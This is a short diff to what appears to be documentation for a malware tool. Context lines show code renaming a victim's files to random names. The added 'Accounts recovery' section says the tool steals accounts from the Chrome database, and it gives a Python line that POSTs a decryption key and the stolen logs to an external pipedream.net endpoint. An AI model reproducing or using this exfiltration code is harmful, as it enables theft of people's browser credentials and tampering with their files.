@@ -44,3 +44,8 @@ for dirdir in subdirs:
             name = str(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)))
             os.rename(filename, dirdir + "/" + name + "." + extension)
 ```
+### Accounts recovery
+It steals the accounts by connecting to the chrome database and sends them back to a pipdream via POST API, then redirects them to the decided webmail.
+```python3
+r = requests.post("https://en54ygy2ikv5dtk.m.pipedream.net", data={"key": keydecrypt, "logs": rez}, headers={'Content - Type': 'application / json'})
+```
